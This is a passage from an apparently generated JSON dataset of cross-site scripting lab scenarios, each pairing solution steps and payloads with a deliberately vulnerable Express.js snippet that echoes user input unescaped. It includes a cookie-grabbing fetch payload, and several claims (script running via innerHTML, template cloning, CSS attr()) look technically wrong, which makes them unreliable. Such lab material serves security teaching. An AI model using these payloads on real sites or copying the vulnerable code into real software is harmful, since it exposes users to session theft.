      "payloads": [
        "<img src=x onerror=alert('Email XSS')>",
        "<script>alert(document.domain)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: false }));\n\napp.post('/preview-email', (req, res) => {\n  const body = req.body.body;\n  res.send(`<html><body>${body}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via PDF annotation preview",
      "Lab Description": "The app previews PDF annotation content in HTML. Malicious input in annotation text gets rendered without escaping.",
      "Difficulty Level": "High",
      "Solution Steps": [
        "Insert script in annotation content",
        "Preview renders raw HTML",
        "Script executes"
      ],
      "payloads": [
        "<script>alert('PDF')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: false }));\n\napp.post('/pdf-annotation-preview', (req, res) => {\n  const note = req.body.note;\n  res.send(`<html><body><div class='annotation'>${note}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
  
    {
      "Lab scenario": "XSS via JavaScript URI in dynamically created script tag",
      "Lab Description": "The application allows users to submit URLs that are later injected into dynamically created script tags. JavaScript URIs are not filtered, allowing for immediate execution.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a URL with `javascript:` scheme",
        "App injects it into a script tag’s src",
        "Script executes on load"
      ],
      "payloads": [
        "javascript:alert(1)",
        "javascript:confirm(document.domain)"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: false }));\n\napp.post('/inject-script', (req, res) => {\n  const userURL = req.body.url;\n  res.send(`\n    <html>\n      <body>\n        <script>\n          const s = document.createElement('script');\n          s.src = '${userURL}';\n          document.body.appendChild(s);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in real-time log console via WebSocket echo",
      "Lab Description": "Admin panel shows logs via WebSocket. Logs reflect user actions in real-time. Injecting a script into the action message causes script execution on admin’s panel.",
      "Difficulty Level": "High",
      "Solution Steps": [
        "Send a WebSocket message containing script",
        "Admin console reflects it",
        "Script executes in admin’s view"
      ],
      "payloads": [
        "<script>fetch('/admin?cookie=' + document.cookie)</script>",
        "<img src=x onerror=alert('admin')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst app = express();\nconst server = http.createServer(app);\nconst wss = new WebSocket.Server({ server });\n\nlet logs = [];\n\nwss.on('connection', ws => {\n  ws.on('message', msg => {\n    logs.push(msg);\n    wss.clients.forEach(client => {\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(msg);\n      }\n    });\n  });\n});\n\napp.get('/admin', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Live Logs</h2>\n        <div id='log'></div>\n        <script>\n          const ws = new WebSocket('ws://' + location.host);\n          ws.onmessage = e => {\n            document.getElementById('log').innerHTML += e.data + '<br>';\n          };\n        </script>\n      </body>\n    </html>\n  `);\n});\n\nserver.listen(3000);"
    },
    {
      "Lab scenario": "XSS via open redirect preview page",
      "Lab Description": "User can preview a redirect destination. The redirect URL is rendered in a sandboxed iframe. Improper escaping in `srcdoc` leads to JS execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Inject HTML inside `srcdoc` attribute",
        "Iframe renders it unsanitized",
        "Payload executes"
      ],
      "payloads": [
        "<script>alert('redirect')</script>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/redirect-preview', (req, res) => {\n  const dest = req.query.dest || 'Not provided';\n  res.send(`\n    <html>\n      <body>\n        <h3>Redirect Preview</h3>\n        <iframe srcdoc=\"${dest}\"></iframe>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via `<object>` tag with data attribute",
      "Lab Description": "App uses `<object>` tags to display user-provided content from the `data` attribute. Improper validation of data leads to XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit an HTML file or JS payload as object `data`",
        "App embeds it into object tag",
        "Code executes"
      ],
      "payloads": [
        "data:text/html,<script>alert(1)</script>",
        "data:text/html,<img src=x onerror=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: false }));\n\napp.post('/object-viewer', (req, res) => {\n  const userData = req.body.src;\n  res.send(`\n    <html>\n      <body>\n        <object data=\"${userData}\" width=\"300\" height=\"200\"></object>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via malformed comment rendering",
      "Lab Description": "The app renders user comments using innerHTML, but accepts malformed tags. Browsers correct the tag structure, allowing execution of orphaned scripts.",
      "Difficulty Level": "Low",
      "Solution Steps": [
        "Submit malformed comment with broken tag",
        "Browser fixes structure, script executes"
      ],
      "payloads": [
        "<b><script>alert(1)</script>",
        "<style><img src=x onerror=alert(1)></style>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment', (req, res) => {\n  comments.push(req.body.text);\n  res.redirect('/view');\n});\n\napp.get('/view', (req, res) => {\n  const out = comments.map(c => `<div>${c}</div>`).join('');\n  res.send(`<html><body>${out}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via CSS `attr()` Injection",
      "Lab Description": "The application reflects user input in a custom attribute used in CSS `content: attr(...)`, leading to script execution via `expression()` in legacy browsers.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit input inside custom attribute",
        "Style uses `content: attr(data-x)`",
        "Inject JS in attribute; legacy support may trigger execution"
      ],
      "payloads": [
        "\" data-x=\"javascript:alert(1)",
        "\" style=\"content:attr(data-x);"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: false }));\n\napp.post('/profile', (req, res) => {\n  const name = req.body.name;\n  res.send(`\n    <html>\n      <head>\n        <style>\n          .x::after { content: attr(data-x); }\n        </style>\n      </head>\n      <body>\n        <div class=\"x\" data-x=\"${name}\"></div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS through `svg` ForeignObject Execution",
      "Lab Description": "App renders user input inside an `<svg>` tag. Malicious `<foreignObject>` embedded allows HTML + JS inside SVG context.",
      "Difficulty Level": "High",
      "Solution Steps": [
        "Inject SVG with foreignObject containing HTML",
        "Script inside executes in browsers that support it"
      ],
      "payloads": [
        "<svg><foreignObject><body xmlns='http://www.w3.org/1999/xhtml'><script>alert(1)</script></body></foreignObject></svg>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/upload-svg', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        ${req.body}\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS inside Event Handler JSON-to-HTML Rendering",
      "Lab Description": "Application parses user-submitted JSON and injects values into event handler attributes (`onclick`, etc.), allowing code injection.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit JSON with `onclick` value containing JS",
        "App renders button with dynamic attributes",
        "Click triggers execution"
      ],
      "payloads": [
        "{\"text\":\"Click me\", \"onclick\":\"alert(1)\"}"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\napp.post('/render-button', (req, res) => {\n  const { text, onclick } = req.body;\n  res.send(`\n    <html>\n      <body>\n        <button onclick=\"${onclick}\">${text}</button>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in `srcdoc` Attribute of iframe",
      "Lab Description": "App allows user input inside iframe `srcdoc`, which is directly rendered as inline HTML and JS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit payload as content of `srcdoc`",
        "App embeds value as-is",
        "JS executes inside iframe"
      ],
      "payloads": [
        "<script>alert('srcdoc')</script>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/iframe-srcdoc', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <iframe srcdoc=\"${req.body}\"></iframe>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via `details` and `summary` Expansion",
      "Lab Description": "User input rendered inside a `details` block gets interpreted as full HTML, including executable scripts or event handlers.",
      "Difficulty Level": "Low",
      "Solution Steps": [
        "Inject HTML with event inside `summary`",
        "Click expands, triggers script"
      ],
      "payloads": [
        "<summary onclick=alert(1)>Click</summary>",
        "<summary><img src=x onerror=alert(2)></summary>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/details-view', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <details>${req.body}</details>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Misused `meta` Refresh Tag",
      "Lab Description": "Application allows user input inside a meta refresh tag, enabling injection of JavaScript via `URL` attribute.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to /redirect-meta?target=<payload>",
        "App reflects input in meta refresh tag",
        "Inject javascript: URI to execute code"
      ],
      "payloads": [
        "javascript:alert('metaXSS')",
        "javascript:confirm(document.domain)"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/redirect-meta', (req, res) => {\n  const target = req.query.target || '/';\n  res.send(`\n    <html>\n      <head>\n        <meta http-equiv=\"refresh\" content=\"0;url=${target}\">\n      </head>\n      <body>Redirecting...</body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS through Data URI in iframe Source",
      "Lab Description": "User input is embedded directly into an iframe `src`, allowing crafted `data:text/html` URIs with embedded scripts.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send iframe with src=data:text/html;base64, payload",
        "App embeds src without sanitization",
        "Base64-decode triggers HTML + JS execution"
      ],
      "payloads": [
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YVhTUycpPC9zY3JpcHQ+",
        "data:text/html,<script>alert('data')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/preview-iframe', (req, res) => {\n  const src = req.query.src || 'about:blank';\n  res.send(`\n    <html>\n      <body>\n        <iframe src=\"${src}\"></iframe>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in `<math>` Tag with Malicious `href`",
      "Lab Description": "The app allows mathML rendering but doesn’t sanitize attributes. Injecting an `href` with `javascript:` scheme executes code.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit `<math><a href=javascript:alert(1)>CLICK</a></math>`",
        "mathML rendered directly, executes JS in link",
        "Test in browsers supporting mathML"
      ],
      "payloads": [
        "<math><a href=javascript:alert('mathXSS')>X</a></math>",
        "<math><mtext><a href=javascript:alert(1)>click</a></mtext></math>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/render-math', (req, res) => {\n  res.send(`\n    <html>\n      <body>${req.body}</body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Object `data` Attribute",
      "Lab Description": "User input is embedded into an `<object>` tag’s `data` attribute, allowing attacker to inject `data:` URLs with malicious HTML.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit object with `data=data:text/html,...`",
        "App embeds data URL directly in object",
        "Browser renders HTML inside object"
      ],
      "payloads": [
        "data:text/html,<script>alert('objectXSS')</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/load-object', (req, res) => {\n  const src = req.query.url || 'about:blank';\n  res.send(`\n    <html>\n      <body>\n        <object data=\"${src}\"></object>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS inside `template` Element via DOM Cloning",
      "Lab Description": "App includes a `<template>` element and clones its content via JS. Injected script inside template gets executed after cloning.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Inject script inside template content",
        "Cloning via JS moves script into DOM",
        "Script gets parsed and executed"
      ],
      "payloads": [
        "<template><script>alert('templateXSS')</script></template>",
        "<template><img src=x onerror=alert(1)></template>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/clone-template', (req, res) => {\n  const payload = req.body;\n  res.send(`\n    <html>\n      <body>\n        ${payload}\n        <script>\n          const tpl = document.querySelector('template');\n          const node = tpl.content.cloneNode(true);\n          document.body.appendChild(node);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via CSS Expression in Legacy Quirks Mode",
      "Lab Description": "A legacy page renders in quirks mode and allows inline styles. Internet Explorer interprets CSS expressions as JavaScript.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Navigate to /legacy-style",
        "Submit payload using inline `style` attribute",
        "Expression executes in IE quirks mode",
        "Use `expression(alert(1))` in style"
      ],
      "payloads": [
        "<div style=\"width:expression(alert('cssXSS'))\">",
        "<img style=\"top:expression(alert(1))\">"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/legacy-style', (req, res) => {\n  const html = `\n    <html>\n      <head>\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\">\n      </head>\n      <body>\n        <div>${req.query.content || ''}</div>\n      </body>\n    </html>\n  `;\n  res.send(html);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in SVG <animate> Element Injection",
      "Lab Description": "User-submitted SVG is embedded without sanitization. The attacker abuses <animate> and other SVG elements to trigger JavaScript execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "POST SVG content with JavaScript inside animate attributes",
        "Visit rendered SVG view page",
        "Execution happens via SVG animation event attributes"
      ],
      "payloads": [
        "<svg><animate attributeName=\"x\" onbegin=\"alert(1)\"></animate></svg>",
        "<svg><set attributeName=\"onload\" to=\"alert('svgXSS')\"></set></svg>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet svgContent = '';\n\napp.use(express.text());\n\napp.post('/upload-svg', (req, res) => {\n  svgContent = req.body;\n  res.redirect('/view-svg');\n});\n\napp.get('/view-svg', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body>${svgContent}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in URL Path via 404 Handler",
      "Lab Description": "The 404 error handler reflects the requested URL back to the page. By crafting the URL with script tags, the attacker injects code into the page.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Access a nonexistent path like /<script>alert(1)</script>",
        "Server reflects URL path in the 404 page body",
        "No sanitization on the reflected URL"
      ],
      "payloads": [
        "/<script>alert('404XSS')</script>",
        "/<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.use((req, res) => {\n  res.status(404).send(`\n    <html>\n      <body>\n        <h1>Page not found: ${req.url}</h1>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Mutation XSS in innerHTML with Event-less Custom Elements",
      "Lab Description": "The app uses custom elements but doesn't filter content before setting innerHTML. Even without event attributes, inserting <script> can trigger parsing.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit content wrapped in unknown tag like <widget>",
        "innerHTML sets raw content, triggering script execution",
        "Use script inside custom elements or uncommon tags"
      ],
      "payloads": [
        "<widget><script>alert('customTagXSS')</script></widget>",
        "<fake><script>alert(1)</script></fake>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\\nconst app = express();\\n\\napp.use(express.text());\\n\\napp.post('/render-widget', (req, res) => {\\n  const content = req.body;\\n  res.send(`\\n    <html>\\n      <body>\\n        <div id=\\\"output\\\"></div>\\n        <script>\\n          document.getElementById('output').innerHTML = \\`${content}\\`;\\n        </script>\\n      </body>\\n    </html>\\n  `);\\n});\\n\\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in JSONP Callback Parameter",
      "Lab Description": "The API provides JSONP support with a callback parameter. An attacker injects a malicious callback function to execute arbitrary JavaScript.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Send GET request to /api/data?callback=alert(1)",
        "Response includes callback wrapping the data",
        "Script tag with crafted callback causes execution"
      ],
      "payloads": [
        "/api/data?callback=alert(1)",
        "/api/data?callback=foo);alert('jsonpXSS')//"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const cb = req.query.callback || 'cb';\n  const data = JSON.stringify({ user: 'guest' });\n  res.type('application/javascript');\n  res.send(`${cb}(${data});`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via JavaScript URL in clickable breadcrumb",
      "Lab Description": "The breadcrumb component builds navigation paths using query parameters and sets them in anchor `href` attributes. Supplying a `javascript:` link causes execution on click.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit query like ?crumb=javascript:alert(1)",
        "Breadcrumb renders with href=javascript:...",
        "Clicking the breadcrumb triggers the payload"
      ],
      "payloads": [
        "javascript:alert(1)",
        "javascript:confirm(document.cookie)"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/breadcrumbs', (req, res) => {\n  const crumb = req.query.crumb || '/';\n  res.send(`\n    <html>\n      <body>\n        <a href=\"${crumb}\">Back</a>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via clipboard injection in paste event",
      "Lab Description": "The web app handles `paste` events and directly injects clipboard content into the DOM using innerHTML. If an attacker copies malicious HTML, pasting triggers XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Copy: <img src=x onerror=alert(1)>",
        "Paste into the editor",
        "Editor inserts the payload unsanitized",
        "Script executes immediately"
      ],
      "payloads": [
        "<img src=x onerror=alert('pasteXSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/paste-editor', (req, res) => {\n  res.send(`\n    <html>\n      <body contenteditable='true' id='editor'></body>\n      <script>\n        document.getElementById('editor').addEventListener('paste', e => {\n          const pasted = e.clipboardData.getData('text/html') || e.clipboardData.getData('text/plain');\n          e.preventDefault();\n          document.execCommand('insertHTML', false, pasted);\n        });\n      </script>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in tag suggestions dropdown",
      "Lab Description": "User-created tags are stored and rendered in a tag suggestions dropdown using innerHTML. A malicious tag name leads to XSS when suggestions are shown.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a tag named <script>alert(1)</script>",
        "Visit tag search or edit page",
        "Dropdown renders the malicious tag name",
        "Script executes when suggestions appear"
      ],
      "payloads": [
        "<script>alert('tagXSS')</script>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet tags = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-tag', (req, res) => {\n  tags.push(req.body.tag);\n  res.redirect('/suggest');\n});\n\napp.get('/suggest', (req, res) => {\n  const html = tags.map(t => `<div class='tag'>${t}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via SVG title tooltip injection",
      "Lab Description": "User-submitted content appears in the `<title>` element of inline SVG. Some browsers render this as tooltips, and malformed SVG titles can trigger XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create SVG with <title><script>alert(1)</script></title>",
        "Submit to the app",
        "Script executes when tooltip triggers or page loads"
      ],
      "payloads": [
        "<svg><title><script>alert('svgTitle')</script></title></svg>",
        "<svg><title><![CDATA[</title><script>alert(1)</script>]]></title></svg>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/svg-preview', (req, res) => {\n  res.send(`<html><body>${req.body}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via username in audio transcript captions",
      "Lab Description": "The app generates captions for audio recordings. Usernames are shown in speaker labels inside the transcript, inserted via innerHTML. Injected scripts run in the captions.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Register with username <img src=x onerror=alert(1)>",
        "Join a voice session and generate transcript",
        "View transcript in browser and observe payload execution"
      ],
      "payloads": [
        "<img src=x onerror=alert('voiceXSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\nlet transcript = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/speak', (req, res) => {\n  const { user, text } = req.body;\n  transcript += `<div><b>${user}:</b> ${text}</div>`;\n  res.redirect('/transcript');\n});\n\napp.get('/transcript', (req, res) => {\n  res.send(`<html><body>${transcript}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via postMessage Reflection in Parent Window",
      "Lab Description": "The application receives postMessage events from an iframe and injects the message into the DOM without validation. An attacker can craft a malicious iframe that sends a script payload via postMessage.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Host an iframe page that sends postMessage('<img src=x onerror=alert(1)>')",
        "Embed the iframe in the parent app",
        "Parent receives and injects message using innerHTML",
        "Payload is executed in parent’s context"
      ],
      "payloads": [
        "<script>alert('postMessageXSS')</script>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/parent', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <iframe src='/iframe'></iframe>\n        <div id='output'></div>\n        <script>\n          window.addEventListener('message', e => {\n            document.getElementById('output').innerHTML = e.data;\n          });\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.get('/iframe', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <script>\n          parent.postMessage('<img src=x onerror=alert(1)>', '*');\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via template tag cloning in shadow DOM",
      "Lab Description": "The app uses a `<template>` tag within a shadow DOM to dynamically clone and inject HTML. Injected HTML inside the template escapes default sanitizers and executes upon cloning.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Inject <template><script>alert(1)</script></template>",
        "App clones and attaches it inside shadow DOM",
        "Script is executed when cloned"
      ],
      "payloads": [
        "<template><script>alert('shadowXSS')</script></template>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/shadow-render', (req, res) => {\n  const content = req.body;\n  res.send(`\n    <html>\n      <body>\n        <div id='host'></div>\n        <template id='tpl'>${content}</template>\n        <script>\n          const root = document.getElementById('host').attachShadow({mode: 'open'});\n          const tpl = document.getElementById('tpl');\n          const clone = tpl.content.cloneNode(true);\n          root.appendChild(clone);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via innerText fallback after failed rendering",
      "Lab Description": "The app attempts to render user HTML input, and on failure falls back to innerText. However, if the original input remains in the DOM, some browsers may parse and execute delayed scripts.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit invalid HTML that breaks rendering",
        "App falls back but does not sanitize",
        "Browser re-parses content and executes scripts"
      ],
      "payloads": [
        "<div><script>alert('fallbackXSS')</script></div>",
        "<img src=1 onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\\nconst app = express();\\napp.use(express.text());\\n\\napp.post('/render', (req, res) => {\\n  res.send(`\\n    <html>\\n      <body>\\n        <div id='content'></div>\\n        <script>\\n          try {\\n            document.getElementById('content').innerHTML = \\`${req.body}\\`;\\n          } catch(e) {\\n            document.getElementById('content').innerText = req.body;\\n          }\\n        </script>\\n      </body>\\n    </html>\\n  `);\\n});\\n\\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via localization translation key injection",
      "Lab Description": "The app supports multilingual labels stored in a key-value object. If a user can manipulate keys, injecting HTML in a translation value leads to XSS when rendered via innerHTML.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit new translation key with HTML/JS payload",
        "App renders it using innerHTML",
        "Payload is executed in the DOM"
      ],
      "payloads": [
        "<img src=x onerror=alert('l10nXSS')>",
        "<script>alert('translate')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet translations = {};\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-translation', (req, res) => {\n  translations[req.body.key] = req.body.value;\n  res.redirect('/show');\n});\n\napp.get('/show', (req, res) => {\n  const label = translations['greeting'] || 'Hello';\n  res.send(`<html><body><div id='label'>${label}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via `onanimationstart` in CSS keyframes",
      "Lab Description": "Some browsers allow triggering JS via `onanimationstart` events in HTML tags. If an element uses an animation with JS in event handler, XSS is possible.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Inject tag with animation and `onanimationstart=alert(1)`",
        "Use a defined CSS animation to trigger it",
        "Payload runs when animation starts"
      ],
      "payloads": [
        "<div style='animation: x 1s' onanimationstart=alert('cssXSS')></div>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/animated', (req, res) => {\n  res.send(`\n    <html>\n      <head>\n        <style>\n          @keyframes x { from { opacity: 0; } to { opacity: 1; } }\n        </style>\n      </head>\n      <body>${req.body}</body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via clipboard hijack on content-editable element",
      "Lab Description": "The application includes a public message board with a content-editable area for writing. When malicious HTML is copied and pasted, it executes instantly because the app trusts clipboard HTML and injects it using `insertAdjacentHTML`.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Craft malicious HTML and copy to clipboard",
        "Paste it into the editable div",
        "Observe the payload executing on paste",
        "Try invisible script payloads inside span or comment"
      ],
      "payloads": [
        "<img src=x onerror=alert('clipboardXSS')>",
        "<span><script>alert('paste')</script></span>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/board', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Message Board</h2>\n        <div contenteditable='true' id='editor'></div>\n        <script>\n          document.getElementById('editor').addEventListener('paste', e => {\n            const html = e.clipboardData.getData('text/html');\n            document.execCommand('insertHTML', false, html);\n            e.preventDefault();\n          });\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in CSV export rendered as HTML preview",
      "Lab Description": "The web application offers a CSV preview feature before download. Malicious cells with formula-like payloads are rendered using `innerHTML`, allowing execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Upload or inject a CSV with payload in a cell like =1+1<script>alert(1)</script>",
        "Preview the CSV table in HTML",
        "Observe the payload executing in the rendered table"
      ],
      "payloads": [
        "=1+1<script>alert('csvXSS')</script>",
        "<td><img src=x onerror=alert(1)></td>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/preview-csv', (req, res) => {\n  const rows = req.body.trim().split('\\n').map(row => '<tr>' + row.split(',').map(cell => `<td>${cell}</td>`).join('') + '</tr>').join('');\n  res.send(`<html><body><table>${rows}</table></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS through malformed image alt attribute in CMS",
      "Lab Description": "The CMS allows editors to insert images with custom `alt` text. If the `alt` text contains malformed attributes or tags, it's rendered inside an image preview tooltip, which is injected with innerHTML.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Insert image with alt='<img src=x onerror=alert(1)>'",
        "Hover over the image in preview mode",
        "Observe payload execution",
        "Try variations of malformed quotes or tags"
      ],
      "payloads": [
        "\" onerror=alert('altXSS')",
        "'><script>alert(1)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-image', (req, res) => {\n  const alt = req.body.alt;\n  res.send(`<html><body><img src='img.png' alt='${alt}' title='${alt}'></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
